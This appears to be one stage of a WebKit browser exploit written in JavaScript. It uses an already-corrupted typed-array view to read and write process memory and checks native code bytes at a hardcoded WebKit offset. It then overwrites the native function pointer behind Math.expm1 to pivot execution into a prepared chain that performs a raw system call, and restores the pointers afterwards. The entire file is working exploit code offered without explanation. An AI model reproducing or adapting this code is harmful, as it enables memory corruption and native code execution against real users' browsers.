// Execute the current-page, owned-buffer plan once and restore both native
// pointers. Every address is recalibrated or checked against the live plan.
var state = window.__fw14ArrayState;
var plan = window.__fw14NativePlan;
var result;
var phase = "preflight";
var slot = -1;
var original = [];
var viewChanged = false;
var slotArmed = false;
var pivotArmed = false;
var slotOriginal = [];
var pivotOriginal = [];
var restoreErrors = [];
try {
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.calibratedViewBase ||
      !state.ownedTypedView ||
      !state.otherTypedView || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_plan_preflight_failed");
  var forged = state.view;
  var a = state.ownedTypedView;
  var b = state.otherTypedView;
  if (a.length !== 65536 || b.length !== 65536 ||
      a[0] !== 0x31 || a[7] !== 0xa8 || b[0] !== 0x42)
    throw new Error("owned_canaries_changed");
  function bytesAt(at) {
    var out = [];
    for (var n = 0; n < 8; n++) out.push(forged[at + n]);
    return out;
  }
  function hexLE(bytes) {
    var out = "0x";
    for (var n = bytes.length - 1; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function hexForward(bytes) {
    var out = "";
    for (var n = 0; n < bytes.length; n++)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function wordOf(value) {
    var out;
    try {
      state.array[0] = value;
      out = bytesAt(state.index);
    } finally {
      state.array[0] = state.a;
    }
    return Number(hexLE(out));
  }
  var base = state.calibratedViewBase;
  var anchorIndex = wordOf(state.addressAnchor) + 8 - base;
  if (!Number.isSafeInteger(base) || base % 4096 !== 0 ||
      !Number.isSafeInteger(anchorIndex) || anchorIndex < 0 ||
      anchorIndex + 3 >= 2097152 ||
      forged[anchorIndex] !== 0x44 ||
      forged[anchorIndex + 1] !== 0x33 ||
      forged[anchorIndex + 2] !== 0x22 ||
      forged[anchorIndex + 3] !== 0x11)
    throw new Error("cached_anchor_gate_failed");
  var live = false;
  try {
    state.addressAnchor.marker = 0x55667788;
    live = forged[anchorIndex] === 0x88 &&
      forged[anchorIndex + 1] === 0x77 &&
      forged[anchorIndex + 2] === 0x66 &&
      forged[anchorIndex + 3] === 0x55;
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (!live) throw new Error("cached_anchor_not_live");
  var aIndex = wordOf(a) - base;
  var expWord = wordOf(Math.expm1);
  if (aIndex < 0 || aIndex + 15 >= 16777216 ||
      !Number.isSafeInteger(expWord) || expWord < 0x200000000)
    throw new Error("live_cells_outside_window");
  slot = aIndex + 8;
  original = bytesAt(slot);
  function pointerBytes(address) {
    if (!Number.isSafeInteger(address) || address <= 0)
      throw new Error("pointer_address_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(address / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function atAddress(address, bytes) {
    var next = pointerBytes(address);
    viewChanged = true;
    try {
      for (var n = 0; n < 8; n++) forged[slot + n] = next[n];
      if (typeof bytes === "number") {
        if (bytes < 1 || bytes > 64) throw new Error("read_size_invalid");
        var out = [];
        for (var r = 0; r < bytes; r++) out.push(a[r]);
        return out;
      }
      if (!bytes || bytes.length !== 8)
        throw new Error("write_size_invalid");
      for (var w = 0; w < 8; w++) a[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++) forged[slot + x] = original[x];
      viewChanged = false;
    }
  }
  function same(actual, expected) {
    if (actual.length !== expected.length) return false;
    for (var n = 0; n < actual.length; n++)
      if (actual[n] !== expected[n]) return false;
    return true;
  }
  var metadata16 = Number(hexLE(atAddress(expWord + 16, 8)));
  var metadata24 = Number(hexLE(atAddress(expWord + 24, 8)));
  if (Number(metadata16 + 40 === plan.functionSlot) +
      Number(metadata24 + 40 === plan.functionSlot) !== 1)
    throw new Error("function_slot_identity_changed");
  slotOriginal = atAddress(plan.functionSlot, 8);
  pivotOriginal = atAddress(plan.pivotCell, 8);
  if (!same(slotOriginal, plan.originalFunctionSlot) ||
      !same(pivotOriginal.slice(0, 7), plan.pivotHeader.slice(0, 7)) ||
      pivotOriginal[7] > 2 ||
      wordOf(plan.pivotObject) !== plan.pivotCell)
    throw new Error("native_pointer_preflight_changed");
  if (hexForward(atAddress(plan.webkitBase + 0x295f948, 9)) !==
      "488b7e30488b07ff10" ||
      hexForward(atAddress(plan.target, 16)) !==
      "48c7c0140000004989ca0f057201c348")
    throw new Error("native_code_bytes_changed");
  var planViews = [plan.store, plan.pivot, plan.stack, plan.frame];
  var planKeys = ["store", "pivot", "stack", "frame"];
  for (var j = 0; j < planKeys.length; j++) {
    var view = planViews[j];
    var idx = wordOf(view) - base;
    if (idx < 0 || idx + 15 >= 16777216 ||
        Number(hexLE(bytesAt(idx + 8))) !== plan.addresses[planKeys[j]])
      throw new Error("owned_buffer_pointer_changed_" + planKeys[j]);
  }
  if (!same(atAddress(plan.addresses.store, 32),
      plan.store.subarray(0, 32)) ||
      !same(atAddress(plan.addresses.pivot, 64),
      plan.pivot.subarray(0, 64)) ||
      !same(atAddress(plan.addresses.stack + plan.stackOffset, 56),
      plan.stack.subarray(plan.stackOffset, plan.stackOffset + 56)))
    throw new Error("owned_chain_bytes_changed");
  var frameView = new DataView(plan.frame.buffer);
  if (frameView.getUint32(0, true) !== 0 ||
      frameView.getUint32(4, true) !== 0 ||
      Math.abs(Math.expm1(1) - 1.718281828459045) > 1e-12)
    throw new Error("baseline_or_frame_changed");
  if (api && typeof api.markSync === "function")
    api.markSync("native_number20_preflight_pass");
  var latestSlot = atAddress(plan.functionSlot, 8);
  var latestPivot = atAddress(plan.pivotCell, 8);
  if (!same(latestSlot, slotOriginal) ||
      !same(latestPivot.slice(0, 7), pivotOriginal.slice(0, 7)) ||
      latestPivot[7] > 2)
    throw new Error("native_pointers_changed_after_marker");
  pivotOriginal = latestPivot;
  phase = "native_call";
  var callReturned = false;
  var callError = null;
  try {
    slotArmed = true;
    atAddress(plan.functionSlot, pointerBytes(plan.webkitBase + 0x295f948));
    pivotArmed = true;
    atAddress(plan.pivotCell, pointerBytes(plan.addresses.store));
    Math.expm1(plan.pivotObject);
    callReturned = true;
  } catch (error) {
    callError = String(error).slice(0, 120);
  } finally {
    if (slotArmed) {
      try { atAddress(plan.functionSlot, slotOriginal); }
      catch (error) { restoreErrors.push("slot:" + String(error).slice(0, 70)); }
    }
    if (pivotArmed) {
      try { atAddress(plan.pivotCell, pivotOriginal); }
      catch (error) { restoreErrors.push("pivot:" + String(error).slice(0, 70)); }
    }
  }
  phase = "verify_restore";
  var slotRestored = same(atAddress(plan.functionSlot, 8), slotOriginal);
  var pivotRestored = same(atAddress(plan.pivotCell, 8), pivotOriginal);
  var viewRestored = hexLE(bytesAt(slot)) === hexLE(original) &&
    a[0] === 0x31 && a[7] === 0xa8 && b[0] === 0x42 &&
    state.array[0] === state.a;
  var expm1Restored = slotRestored && pivotRestored &&
    Math.abs(Math.expm1(1) - 1.718281828459045) <= 1e-12;
  var pid = frameView.getInt32(0, true);
  var high = frameView.getUint32(4, true);
  if (api && typeof api.markSync === "function")
    api.markSync("native_number20_restored");
  result = { id: "native_call_number20_v2",
    status: callReturned && pid > 0 && pid < 0x1000000 && high === 0 &&
      slotRestored && pivotRestored && viewRestored && expm1Restored &&
      restoreErrors.length === 0 ? "pass" : "fail",
    details: { webkit_base: "0x" + plan.webkitBase.toString(16),
      target: "0x" + plan.target.toString(16),
      call_returned: callReturned, pid: pid, return_high: high,
      slot_restored: slotRestored, pivot_restored: pivotRestored,
      view_restored: viewRestored, expm1_restored: expm1Restored,
      call_error: callError,
      restore_error: restoreErrors.length ? restoreErrors.join(";") : null } };
} catch (error) {
  if (viewChanged && state && state.view && original.length === 8 && slot >= 0)
    for (var y = 0; y < 8; y++) state.view[slot + y] = original[y];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "native_call_number20_v2", status: "error",
    details: { phase: phase, error: String(error).slice(0, 200) } };
}
return [result];
